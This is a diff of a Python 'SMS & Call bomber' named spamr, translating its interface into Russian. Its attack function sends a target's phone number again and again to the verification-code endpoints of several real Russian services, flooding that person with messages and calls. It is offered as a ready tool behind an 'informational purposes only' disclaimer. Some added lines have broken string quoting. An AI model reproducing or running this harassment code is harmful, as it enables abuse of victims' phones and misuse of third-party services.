@@ -13,7 +13,7 @@ def logo():
     print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
     print("\u001b[33m                   v0.3.3                  ")
     print("\u001b[33m                                          ")
-    print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z \u001b[32mto exit   ")
+    print("\u001b[95m     \u001b[32mSMS\u001b[95m & \u001b[32mCall bomber. \u001b[95mCTRL + Z \u001b[32m для выхода   ")
     print("                                                    ")        
 
 try:
@@ -21,7 +21,7 @@ try:
 except:
     os.system("clear")
     logo()
-    print("\u001b[33m[!] \u001b[31mREQUESTS not installed, start installation!\033[0m\n")
+    print("\u001b[33m[!] \u001b[31m"REQUESTS" не установлен, начинаю установку!\033[0m\n")
     time.sleep(2)
     os.system("clear")
     os.system("pip install requests")
@@ -31,7 +31,7 @@ try:
 except:
     os.system("clear")
     logo()
-    print("\u001b[33m[!] \u001b[31mGETCH not installed, start installation!\033[0m\n")
+    print("\u001b[33m[!] \u001b[31m"GETCH" не установлен, начинаю установку!\033[0m\n")
     time.sleep(2)
     os.system("clear")
     os.system("pip install py-getch")
@@ -41,7 +41,7 @@ try:
 except:
     os.system("clear")
     logo()
-    print("\u001b[33m[!] \u001b[31mTERMCOLOR not installed, start installation!\033[0m\n")
+    print("\u001b[33m[!] \u001b[31m"TERMCOLOR" не установлен, начинаю установку!\033[0m\n")
     time.sleep(2)
     os.system("clear")
     os.system("pip install termcolor")
@@ -53,7 +53,7 @@ def connected_to_internet(url='http://www.google.com/', timeout=5):
         return True
     except requests.ConnectionError:
         logo()
-        print("\u001b[33m[!] \u001b[31mNo internet connection available.\033[0m\n")
+        print("\u001b[33m[!] \u001b[31mОтсутствует интернет-соединение.\033[0m\n")
         time.sleep(2)
         os.system("python spamr.py")
     return False
@@ -71,7 +71,7 @@ _delay = "0"
 
 logo()
 print("\u001b[41m\u001b[32mMENU\u001b[49m:\n\u001b[33m[1]\u001b[32m SMS BOMBER.\n\u001b[33m[2]\u001b[32m UPDATE SPAMR.\n\u001b[33m[3]\u001b[32m ABOUT.\n")
-menu = input("\u001b[33mEnter your choice: \033[0m")
+menu = input("\u001b[33mВведите номер пункта: \033[0m")
 
 if menu == "1" or menu == "2" or menu == "3":
     pass
@@ -79,10 +79,10 @@ else:
     os.system("python spamr.py")
 if menu == "2":
     logo()
-    print("\u001b[33m[+] \u001b[32mChecking your internet connection...\033[0m ")
+    print("\u001b[33m[+] \u001b[32mПроверка вашего интернет-соединения...\033[0m ")
     connected_to_internet()
     logo()
-    up = input("\u001b[33m[!] \u001b[32mAre you sure you want to update the program? (\u001b[95my\u001b[33m/\u001b[95mn\u001b[33m): \033[0m")
+    up = input("\u001b[33m[!] \u001b[32mВы точно хотите обновить программу? (\u001b[95my\u001b[33m/\u001b[95mn\u001b[33m): \033[0m")
 
     if up == "y":
         pass
@@ -96,49 +96,49 @@ if menu == "2":
 
 if menu == "3":
     logo()
-    print("\u001b[33mINFO:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.1\u001b[33m\nCONTACTS:\n\u001b[34m  Telegram:\u001b[95m @BreadToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mThis program was created for informational purposes ONLY!\nThe creator of this program does not bear ANY responsibility for your actions!\n\n\u001b[33mTo make the program fully functional, save it to the root directory.\nDO NOT CHANGE THE NAME OF THE PROGRAM OR ALL SUPPORTING PROGRAMS!\n\n\u001b[32mThanks Google Translate.\u001b[95m :D\n\033[0m ")
+    print("\u001b[33mИНФОРМАЦИЯ:\n\u001b[34m  SMS\u001b[95m & \u001b[34mCall bomber.\n\u001b[34m  SPAMR v0.3.1\u001b[33m\nКОНТАКТЫ:\n\u001b[34m  Telegram:\u001b[95m @BreadToBad\n\u001b[34m  GitHub:\u001b[95m github.com/kirill2281337227/spamr\n\n\u001b[31mДанная программа создана ТОЛЬКО для ознакомления!\nАвтор данной программы не нисет НИКАКОЙ ответственности за ваши действия!\n\n\u001b[33mЧтобы программа работала исправно - директория данной программы должна находиться в корневом каталоге.\nНЕ ИЗМЕНЯЙТЕ НАЗВАНИЕ ПРОГРАММЫ И ВСЕХ ВСПОМОГАТЕЛЬНЫХ ФАЙЛОВ!\n\n\u001b[32mУдачи.\u001b[95m :D\n\033[0m ")
     pause()
     os.system("python spamr.py")
 
 if menu == "1":
     atack1 = "0"
     logo()
-    print("\u001b[33m[+] \u001b[32mChecking your internet connection...\033[0m ")
+    print("\u001b[33m[+] \u001b[32mПроверка вашего интернет-соединения...\033[0m ")
     connected_to_internet()
     logo()
-    _phone = input("\u001b[31mEnter number:\033[0m ")
+    _phone = input("\u001b[31mВведите номер (В формате: 7XXXXXXXXXX):\033[0m ")
 
     if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
         pass
     else:
         logo()
-        print("\u001b[33m[!] \u001b[31mIncorrect number!\n\033[0m")
+        print("\u001b[33m[!] \u001b[31mНомер указан некорректно!\n\033[0m")
         time.sleep(1)
         os.system("python spamr.py")
 
 def atack():
     atack1 = "1"
     a  = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
-    print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
+    print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
     delay()
 
     a  = requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-    print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
+    print("\\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
     delay()
 
     a  = requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
-    print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
+    print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
     delay()
 
     a = requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+" + _phone})
-    print("\u001b[32mMessage sent \033[0m>>\u001b[33m  {0}.".format(a))
+    print("\u001b[33m[+] \u001b[32mЗапрос отправлен \033[0m>>\u001b[33m  {0}.".format(a))
     delay()
 
 
 
 
     logo()
-    print("\u001b[33m[+]\u001b[32m The attack is over!")
+    print("\u001b[33m[+]\u001b[32m Атака завершена!")
     time.sleep(2)
 
 
@@ -149,11 +149,11 @@ def atack():
 
 if atack1 == "0":                                                         
     try:
-        _delay = int(input("\u001b[31mEnter delay:\033[0m "))
+        _delay = int(input("\u001b[31mВведите задержку (сек.):\033[0m "))
         atack2 = "1"
     except:
         logo()
-        print("\u001b[33m[!] \u001b[31mIncorrect delay!\033[0m\n")
+        print("\u001b[33m[!] \u001b[31mЗадержка указана некорректно!\033[0m\n")
         time.sleep(1)
         os.system("python spamr.py")
 
@@ -164,7 +164,7 @@ if atack2 == "1":
     except:
         clear()
         logo()
-        print("\u001b[33m[!]\u001b[31m Attack is stopped! Error sending a query.\033[0m\n")
+        print("\u001b[33m[!]\u001b[31m Атака остановлена! Не удалось отправить запрос.\033[0m\n")
         pause()
         os.system("python spamr.py")
 
